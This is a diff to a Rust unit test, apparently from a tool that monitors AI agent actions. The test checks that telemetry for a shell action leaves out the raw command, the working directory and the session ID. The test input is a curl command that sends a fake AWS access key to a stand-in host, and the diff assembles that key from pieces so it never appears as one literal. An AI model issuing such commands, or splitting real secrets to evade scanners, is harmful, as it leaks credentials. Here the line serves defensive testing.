@@ -115,13 +115,14 @@ mod tests {
 
     #[test]
     fn telemetry_event_does_not_serialize_raw_action_content() {
+        let fake_aws = concat!("AKIA", "IOSFODNN7EXAMPLE");
         let event = ActionEvent::new(
             AgentHost::ClaudeCode,
             "session-with-secret",
             OsPrincipal::Uid(1000),
             Phase::Pre,
             Action::Shell {
-                command: "curl https://example.invalid/AKIAIOSFODNN7EXAMPLE".to_string(),
+                command: format!("curl https://example.invalid/{fake_aws}"),
                 cwd: PathBuf::from("C:/private/project"),
             },
         );
@@ -134,7 +135,7 @@ mod tests {
         }
         .build("claude_code", Some("native_hook"));
         let json = serde_json::to_string(&telemetry).unwrap();
-        assert!(!json.contains("AKIAIOSFODNN7EXAMPLE"));
+        assert!(!json.contains(fake_aws));
         assert!(!json.contains("private/project"));
         assert!(!json.contains("session-with-secret"));
         assert!(json.contains("network_utility"));
